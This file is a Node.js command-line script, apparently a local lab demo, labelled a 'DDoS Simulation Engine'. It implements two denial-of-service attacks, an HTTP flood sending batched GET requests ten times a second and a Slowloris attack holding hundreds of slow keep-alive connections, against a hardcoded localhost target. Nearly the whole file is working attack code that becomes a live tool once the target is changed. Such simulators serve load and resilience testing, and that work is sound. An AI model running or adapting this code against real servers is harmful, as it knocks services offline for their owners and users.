const axios = require('axios');
const http = require('http');

const TARGET_URL = 'http://localhost:3001/api/data';
let attackInterval = null;
let activeConnections = [];

const modes = {
    HTTP_FLOOD: 'HTTP_FLOOD',
    SLOWLORIS: 'SLOWLORIS',
    IDLE: 'IDLE'
};

let currentMode = modes.IDLE;

async function httpFlood(intensity) {
    console.log(`[ATTACK] Starting HTTP Flood - Intensity: ${intensity} requests/batch`);
    attackInterval = setInterval(async () => {
        const batch = [];
        for (let i = 0; i < intensity; i++) {
            batch.push(axios.get(TARGET_URL).catch(e => {
                // Ignore errors (expected during DDoS)
            }));
        }
        await Promise.all(batch);
    }, 100); // Send 10 batches per second
}

function slowloris(count) {
    console.log(`[ATTACK] Starting Slowloris - Opening ${count} slow connections`);
    for (let i = 0; i < count; i++) {
        const options = {
            hostname: 'localhost',
            port: 3001,
            path: '/',
            method: 'GET',
            headers: {
                'Content-Length': '100000',
                'Connection': 'keep-alive'
            }
        };

        const req = http.request(options, (res) => {});
        req.on('error', (e) => {});
        
        // Send a byte every 5 seconds to keep connection open
        const interval = setInterval(() => {
            if (req.writable) {
                req.write('a');
            } else {
                clearInterval(interval);
            }
        }, 5000);

        activeConnections.push({ req, interval });
    }
}

function stopAttack() {
    if (attackInterval) clearInterval(attackInterval);
    activeConnections.forEach(c => {
        clearInterval(c.interval);
        c.req.destroy();
    });
    activeConnections = [];
    console.log('[SYSTEM] Attack Stopped.');
}

// Simple CLI Interface
const readline = require('readline');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function showMenu() {
    console.log('\n--- DDoS Simulation Engine ---');
    console.log('1. Launch HTTP Flood (Volumetric)');
    console.log('2. Launch Slowloris (Connection Exhaustion)');
    console.log('3. Stop All Activity');
    console.log('4. Exit');
    rl.question('Select an option: ', handleMenu);
}

function handleMenu(choice) {
    switch (choice) {
        case '1':
            stopAttack();
            rl.question('Enter intensity (requests per batch, e.g., 50): ', (num) => {
                httpFlood(parseInt(num) || 50);
                showMenu();
            });
            break;
        case '2':
            stopAttack();
            rl.question('Enter connection count (e.g., 200): ', (num) => {
                slowloris(parseInt(num) || 200);
                showMenu();
            });
            break;
        case '3':
            stopAttack();
            showMenu();
            break;
        case '4':
            stopAttack();
            process.exit(0);
            break;
        default:
            console.log('Invalid choice');
            showMenu();
    }
}

console.log('DDoS Simulator Engine Ready.');
showMenu();
